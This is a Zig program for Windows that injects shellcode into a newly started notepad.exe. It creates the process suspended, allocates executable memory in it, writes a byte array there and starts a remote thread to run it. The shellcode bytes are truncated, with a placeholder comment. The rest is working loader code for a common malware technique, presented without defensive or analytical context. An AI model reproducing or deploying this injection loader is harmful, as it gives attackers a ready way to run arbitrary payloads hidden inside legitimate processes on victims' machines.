const std = @import("std");
const win = std.os.windows;
const unicode = std.unicode;

// Define CREATE_SUSPENDED constant manually
const CREATE_SUSPENDED = 0x00000004;

// External function declarations
extern "kernel32" fn CreateRemoteThread(
    hProcess: win.HANDLE,
    lpThreadAttributes: ?*win.SECURITY_ATTRIBUTES,
    dwStackSize: win.SIZE_T,
    lpStartAddress: win.LPTHREAD_START_ROUTINE,
    lpParameter: ?win.LPVOID,
    dwCreationFlags: win.DWORD,
    lpThreadId: ?*win.DWORD,
) callconv(win.WINAPI) ?win.HANDLE;

extern "kernel32" fn CreateProcessW(
    lpApplicationName: ?win.LPCWSTR,
    lpCommandLine: ?win.LPWSTR,
    lpProcessAttributes: ?*win.SECURITY_ATTRIBUTES,
    lpThreadAttributes: ?*win.SECURITY_ATTRIBUTES,
    bInheritHandles: win.BOOL,
    dwCreationFlags: win.DWORD,
    lpEnvironment: ?win.LPVOID,
    lpCurrentDirectory: ?win.LPCWSTR,
    lpStartupInfo: *win.STARTUPINFOW,
    lpProcessInformation: *win.PROCESS_INFORMATION,
) callconv(win.WINAPI) win.BOOL;

extern "kernel32" fn OpenProcess(
    dwDesiredAccess: win.DWORD,
    bInheritHandle: win.BOOL,
    dwProcessId: win.DWORD,
) callconv(win.WINAPI) ?win.HANDLE;

extern "kernel32" fn VirtualAllocEx(
    hProcess: win.HANDLE,
    lpAddress: ?*anyopaque,
    dwSize: usize,
    flAllocationType: win.DWORD,
    flProtect: win.DWORD,
) callconv(win.WINAPI) ?*anyopaque;

extern "kernel32" fn WriteProcessMemory(
    hProcess: win.HANDLE,
    lpBaseAddress: *anyopaque,
    lpBuffer: [*]const u8,
    nSize: usize,
    lpNumberOfBytesWritten: ?*usize,
) callconv(win.WINAPI) win.BOOL;

extern "kernel32" fn ResumeThread(hThread: win.HANDLE) callconv(win.WINAPI) win.DWORD;

pub fn main() !void {
    // Shellcode (Hello, MessageBox example, shortened for brevity)
    const shellcode = [_]u8{
        0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0,
        0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
        0x56,
        // (Additional shellcode bytes go here)
    };

    const alloc: std.mem.Allocator = std.heap.page_allocator;

    // Create UTF-16 command line for `notepad.exe`
    const wide_cmd_line = try unicode.utf8ToUtf16LeWithNull(alloc, "notepad.exe");
    defer alloc.free(wide_cmd_line);

    // Initialize process startup info
    var startup_info: win.STARTUPINFOW = std.mem.zeroes(win.STARTUPINFOW);
    startup_info.cb = @sizeOf(win.STARTUPINFOW);
    var process_info: win.PROCESS_INFORMATION = undefined;

    // Create `notepad.exe` in a suspended state
    const creation_result = CreateProcessW(
        null,
        wide_cmd_line.ptr,
        null,
        null,
        win.FALSE,
        CREATE_SUSPENDED, // Use the manually defined constant
        null,
        null,
        &startup_info,
        &process_info,
    );

    if (creation_result == 0) {
        std.debug.print("[+] CreateProcessW failed: {}\n", .{win.kernel32.GetLastError()});
        return error.CreateProcessFailed;
    }
    defer {
        _ = win.CloseHandle(process_info.hProcess);
        _ = win.CloseHandle(process_info.hThread);
    }

    std.debug.print("[+] Process ID: {}\n", .{process_info.dwProcessId});
    std.debug.print("[+] Process Handle: 0x{x}\n", .{@intFromPtr(process_info.hProcess)});
    std.debug.print("[+] Thread Handle: 0x{x}\n", .{@intFromPtr(process_info.hThread)});

    // Allocate memory in the remote process for shellcode
    const remote_buffer = VirtualAllocEx(
        process_info.hProcess,
        null,
        shellcode.len,
        win.MEM_COMMIT | win.MEM_RESERVE,
        win.PAGE_EXECUTE_READWRITE,
    ) orelse {
        std.debug.print("VirtualAllocEx failed: {}\n", .{win.kernel32.GetLastError()});
        return error.VirtualAllocExFailed;
    };

    std.debug.print("[+] Allocated memory address: 0x{x}\n", .{@intFromPtr(remote_buffer)});

    // Write the shellcode into the allocated memory in the remote process
    var bytes_written: usize = undefined;
    const write_result = WriteProcessMemory(
        process_info.hProcess,
        remote_buffer,
        &shellcode,
        shellcode.len,
        &bytes_written,
    );

    if (write_result == 0) {
        std.debug.print("WriteProcessMemory failed: {}\n", .{win.kernel32.GetLastError()});
        return error.WriteProcessMemoryFailed;
    }

    std.debug.print("[+] Successfully wrote {} bytes to the target process.\n", .{bytes_written});

    // Create a remote thread in the suspended process for the shellcode
    const thread_handle = CreateRemoteThread(
        process_info.hProcess,
        null,
        0,
        @ptrCast(remote_buffer),
        null,
        CREATE_SUSPENDED, // Use the manually defined constant
        null,
    ) orelse {
        std.debug.print("CreateRemoteThread failed: {}\n", .{win.kernel32.GetLastError()});
        return error.CreateRemoteThreadFailed;
    };
    defer _ = win.CloseHandle(thread_handle);

    std.debug.print("[+] Remote thread created. Handle: 0x{x}\n", .{@intFromPtr(thread_handle)});

    // Resume the suspended thread to execute the shellcode
    _ = ResumeThread(thread_handle);

    std.debug.print("[+] Resumed thread for shellcode execution.\n", .{});
}
